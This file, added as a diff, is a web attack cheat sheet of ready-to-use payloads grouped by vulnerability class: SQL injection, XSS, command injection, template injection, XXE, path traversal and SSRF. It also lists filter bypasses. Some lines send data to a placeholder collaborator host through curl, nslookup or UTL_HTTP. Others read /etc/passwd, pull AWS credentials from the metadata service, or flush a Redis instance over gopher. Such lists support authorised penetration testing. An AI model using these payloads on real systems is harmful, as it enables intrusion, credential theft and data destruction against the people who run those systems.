@@ -1,0 +1,181 @@
+=== Ready-to-Use Payloads by Vulnerability Class ===
+
+--- SQL INJECTION ---
+
+  Detection:
+    '
+    ' OR '1'='1
+    ' OR 1=1--
+    " OR 1=1--
+
+  UNION-based (adjust column count):
+    ' UNION SELECT NULL--
+    ' UNION SELECT NULL,NULL--
+    ' UNION SELECT NULL,NULL,NULL--
+    ' UNION SELECT @@version,NULL,NULL--
+    ' UNION SELECT table_name,NULL FROM information_schema.tables--
+    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+    ' UNION SELECT username,password FROM users--
+    ' UNION SELECT CONCAT(username,':',password) FROM users--
+
+  Error-based (MySQL):
+    ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+    ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+
+  Time-based blind:
+    ' AND SLEEP(5)--                          (MySQL)
+    '; SELECT pg_sleep(5)--                   (PostgreSQL)
+    '; WAITFOR DELAY '0:0:5'--                (MSSQL)
+    ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--  (Oracle)
+
+  Boolean blind:
+    ' AND 1=1--     (true)
+    ' AND 1=2--     (false)
+    ' AND SUBSTRING(@@version,1,1)='5'--
+
+  Out-of-band:
+    MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.COLLAB\\a'))--
+    MSSQL:  '; EXEC master..xp_dirtree '\\COLLAB\share'--
+    Oracle: ' UNION SELECT UTL_HTTP.REQUEST('http://COLLAB/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
+    PgSQL:  '; COPY (SELECT version()) TO PROGRAM 'curl COLLAB'--
+
+  Filter bypasses:
+    /*!50000UNION*/ SELECT 1,2,3             (MySQL version comment)
+    UNION%0ASELECT%0A1,2,3                   (newline)
+    uNiOn SeLeCt 1,2,3                       (mixed case)
+
+--- XSS ---
+
+  HTML context:
+    <script>alert(1)</script>
+    <img src=x onerror=alert(1)>
+    <svg onload=alert(1)>
+    <input onfocus=alert(1) autofocus>
+    <details open ontoggle=alert(1)>
+    <iframe src="javascript:alert(1)">
+
+  Attribute context:
+    " onmouseover="alert(1)
+    " onfocus="alert(1)" autofocus="
+    ' onmouseover='alert(1)
+
+  JavaScript context:
+    ';alert(1)//
+    </script><script>alert(1)</script>
+    '-alert(1)-'
+    ${alert(1)}
+
+  Filter bypasses:
+    <ScRiPt>alert(1)</sCrIpT>                (case variation)
+    <img src=x onerror=\u0061lert(1)>        (unicode)
+    <img src=x onerror=&#97;lert(1)>         (HTML entities)
+    <img src=x onerror=alert`1`>             (template literal)
+    <script>onerror=alert;throw 1</script>   (no parentheses)
+    <img src=x onerror=confirm(1)>           (alternative function)
+    <svg/onload=alert(1)>                    (self-closing)
+
+--- COMMAND INJECTION ---
+
+  Basic:
+    ; id              | id              || id
+    & id              && id             `id`              $(id)
+
+  Blind:
+    ; sleep 5         | sleep 5         & sleep 5
+    ; nslookup $(whoami).COLLAB
+    ; curl http://COLLAB/$(id)
+
+  Space bypass:
+    ;{cat,/etc/passwd}          ;cat${IFS}/etc/passwd
+    ;cat$IFS/etc/passwd         ;cat<>/etc/passwd
+
+  Keyword bypass:
+    ;c'a't /etc/passwd          ;c"a"t /etc/passwd
+    ;c\at /etc/passwd           ;/bin/ca? /etc/passwd
+
+--- SSTI ---
+
+  Detection (universal):
+    ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  *{7*7}  @(7*7)
+
+  Jinja2 (Python):
+    {{config}}
+    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+  Twig (PHP):
+    {{['id']|filter('system')}}
+    {{['cat\x20/etc/passwd']|filter('system')}}
+
+  Freemarker (Java):
+    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+  ERB (Ruby):
+    <%= system('id') %>
+    <%= `id` %>
+
+  Pebble (Java):
+    {% set cmd = 'id' %}
+    {% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+    {{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+--- XXE ---
+
+  Basic file read:
+    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+  SSRF via XXE:
+    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/admin">]><foo>&xxe;</foo>
+
+  Blind OOB:
+    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLAB/evil.dtd">%xxe;]><foo>&send;</foo>
+
+  XInclude:
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+--- PATH TRAVERSAL ---
+
+  Basic:
+    ../../../etc/passwd
+    ....//....//....//etc/passwd
+
+  Encoding:
+    ..%2f..%2f..%2fetc%2fpasswd          (URL encode)
+    %252e%252e%252f                       (double encode)
+    ..%c0%af..%c0%afetc/passwd            (unicode)
+
+  Bypass filters:
+    ....//....//....//etc/passwd          (double dots stripped)
+    images/../../../etc/passwd            (path starts with expected dir)
+    ../../../etc/passwd%00.jpg            (null byte + extension)
+
+--- SSRF ---
+
+  Localhost bypass:
+    http://127.0.0.1    http://localhost    http://127.1
+    http://0.0.0.0      http://[::1]       http://0
+    http://2130706433   http://0x7f000001  http://017700000001
+
+  Cloud metadata:
+    http://169.254.169.254/latest/meta-data/                        (AWS)
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS creds)
+    http://metadata.google.internal/computeMetadata/v1/             (GCP)
+    http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
+
+  Protocol wrappers:
+    file:///etc/passwd
+    dict://localhost:11211/stat
+    gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+
+--- FILTER BYPASS QUICK REFERENCE ---
+
+  Technique          Bypass
+  ---------          ------
+  Case filter        SeLeCt, UnIoN
+  Space filter       /**/, %09, %0a, +
+  Quote filter       CHAR(), hex encoding
+  Keyword filter     UN/**/ION, comments
+  Path filter        ....// , double encoding
+  Protocol filter    Alternative schemes, IPv6
+  IP filter          Decimal, hex, octal
+  Double encoding    %252e%252e%252f
